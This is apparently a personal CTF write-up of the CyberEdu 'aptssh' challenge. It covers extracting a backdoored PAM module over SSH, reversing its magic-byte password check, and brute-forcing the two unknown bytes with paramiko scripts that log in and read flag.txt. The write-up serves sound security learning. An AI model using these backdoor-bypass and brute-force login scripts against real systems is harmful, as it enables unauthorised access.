+++
date = '2025-12-23'
draft = false
title = 'CyberEdu aptssh Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "reverse-engineering", "ssh"]
+++

## Challenge overview


Someone backdoored us with a strange PAM module, and now anyone can **[log in](https://app.cyber-edu.co/challenges/9d17be93-349a-4de8-acb8-045c03fe7b5b?tenant=cyberedu)** with aptssh:aptssh. I think they were able to get our flag.

First of all, what is a *PAM module*? Well, PAM stands for Pluggable Authentification Modules, and it's how Linux decides how we can log in, how passwords are checked, and so on.

![challenge-screenshot](pic1.png#center)

So, nc isn't going to be how we solve this. Instead, we're going to login using `ssh` like so:

`ssh aptssh@34.89.226.167 -p 31427`

(Obviously different ip and port than I used). After inputting our password, aptssh, as hinted by the description, we get this back:

![challenge-screenshot](pic2.png#center)

---

## Getting the ELF

Alright, so, weird, what could this be? Well, since this is still a `pwn` challenge, guess what, an **ELF**! (More precisely, two). We can tell because of the ELF so file header bytes (`\004\274\242\301\303\`). Let's see if we can tell what's happening by b64 decoding the input.

![challenge-screenshot](pic3.png#center)

We can find a lot of interesting strings:

- /lib/security/pam_passfile.so

- /home/sshuser/pass.txt

- Username:

- aptssh

- send_debug_message

- output_base64_file

- pam_sm_authenticate


I extracted the entire file using `script -q -c "ssh -tt aptssh@34.89.226.167 -p 31427" dump.bin`. I removed the first and last lines, then ran this:

```python
strings dump.bin \
| grep -E '[A-Za-z0-9+/]{200,}={0,2}' \
| tr -d '\n' \
> b64.txt
```

Then this:

```python
base64 -d b64.txt > pam_dump.so
```

And finally, we get the ELF so file.

![challenge-screenshot](pic4.png#center)

---

## Analyzing the ELF

We find a couple interesting functions here: 

![challenge-screenshot](pic5.png#center)

![challenge-screenshot](pic6.png#center)

And then this longer function, `pam_sm_authenticate`:

![challenge-screenshot](pic7.png#center)

![challenge-screenshot](pic8.png#center)

![challenge-screenshot](pic9.png#center)

What's important here, are these lines of code:

```python

if ( strlen(s1) > 100 )
  {
    v5 = 7000;
    do
      v5 -= 8;
    while ( v5 );
    s2 = 0xADC29EC3;
    v18 = 0xAFC3;
    v17 = v13;
    s[0] = 0;
    result = memcmp(s1 + 100, &s2, 9u);
    if ( !result )
    {
      v10 = 10000;
      do
        v10 -= 8;
      while ( v10 );
      return result;
    }
  }

```

For all passwords longer than 100, we compare the 9 bytes starting at s1 + 100 with the ones starting at s2. And this is what our stack looks like:

```python
s2  = -1379754301;   // 4 bytes
v18 = -20541;        // 2 bytes
v17 = v13;           // 2 bytes (uninitialized but later zeroed)
s[0] = 0;            // 1 byte
```

So the password has to be 
`[ any 100 bytes ]` and then some specific bytes, `\xAD\xC2\x9E\xC3 \x??\x?? \xAF\xC3 \x00`.

We can verify this since if the password is over 100 characters long, like in the first part of the image, connection gets closed immediately, but otherwise any length under 100 asks for the password again:

![challenge-screenshot](pic10.png#center)

There's a big problem though, we can't pass raw bytes as `ssh` terminal input. And these characters are non-printable. So the workaround for this is using `paramiko`. `paramiko` avoids the `tty` completely, and can therefore send raw bytes. Those bytes I marked with `\x??\x??` are the `v17=v13` that we have no idea about, so we might have to bruteforce them.

But guess what, I thought paramiko is unstable on python 3.13, because why wouldn't it be? So I moved to a python 3.11 venv. I made one using `pyenv` and installing python 3.11. I named it `python311`, and `pyenv` created it at `~/.pyenv/versions/python311/`, and I can always activate it like so: `pyenv activate python311`. If this seems like a lot of unnecessary detail, it's so I myself can remember what I installed in a week from now, when I'll have forgotten whatever it is I did today.

Same error on python 3.11, that I got on 3.13, that made me think it was a compatibility issue. 

![challenge-screenshot](pic11.png#center)

Right now, my payload looks like so:

```python
import paramiko
from pwn import *

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

payload = b"a" * 100
#s2
payload += p32(0xADC29EC3) #4 bytes so p32
#v17 - no clue what this is
payload += p16(0xABCD) #2 bytes so p16
#v18
payload += p16(0xAFC3)
#s[0]
payload += b'\x00'

cli.connect(
    hostname='34.89.226.167',
    port=30266,
    username='sshuser',
    password=payload
)

stdin, stdout, stderr = cli.exec_command("id")
print(stdout.read().decode())

cli.close()

```

The problem is we didn't input the correct password. Why? Because we don't have a clue what `v17` could be. So we're going to have to bruteforce it.

I ran this script and watched about five episodes of Seinfeld, when I realized that when my laptop automatically enters sleep mode no connections are being made:

```python
import paramiko
from pwn import *

for v17 in range(0xFFFF, -1, -1):

    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    payload  = b"a" * 100
    payload += p32(0xADC29EC3)
    payload += p16(v17)
    payload += p16(0xAFC3)
    payload += b'\x00'

    try:
        cli.connect(
            hostname='34.89.226.167',
            port=30266,
            username='sshuser',
            password=payload,
            timeout=0.3,
            banner_timeout=0.3,
            auth_timeout=0.3,
            allow_agent=False,
            look_for_keys=False
        )

        print(f"v17 = {hex(v17)}")

        stdin, stdout, stderr = cli.exec_command("cat flag.txt")
        print(stdout.read().decode())

        cli.close()
        break  

    except paramiko.ssh_exception.AuthenticationException:
        pass
    except Exception:
        pass

    cli.close()

    if v17 % 256 == 0:
        print(f"tried {hex(v17)}")

```

So the second time I used caffeine and we get the flag! Took about half an hour or so.

![challenge-screenshot](pic12.png#center)

To be completely honest, there might've been a way to actually *find out* `v17`'s value, but if it works it works right?

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/aptssh.py)**.
